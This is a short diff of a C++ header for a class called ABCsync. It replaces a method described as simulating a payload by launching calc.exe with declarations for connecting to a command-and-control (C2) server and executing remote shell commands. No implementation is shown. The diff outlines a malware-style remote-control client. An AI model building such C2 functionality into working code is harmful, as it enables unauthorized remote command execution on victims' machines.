@@ -1,9 +1,19 @@
 #ifndef ABCSYNC_H
 #define ABCSYNC_H
 
+#include <string>
+
 class ABCsync {
 public:
-    bool executePayload();  // Simulate the execution of the payload (e.g., launching calc.exe)
+    // Connect to the C2 server
+    bool connectToC2(const std::string& c2Address, int port);
+
+    // Execute the remote shell command
+    bool executeRemoteCommand(const std::string& command);
+
+private:
+    // Helper function to establish a connection and handle command execution
+    bool executeCommand(const std::string& command);
 };
 
-#endif // ABCSYNC_H
+#endif
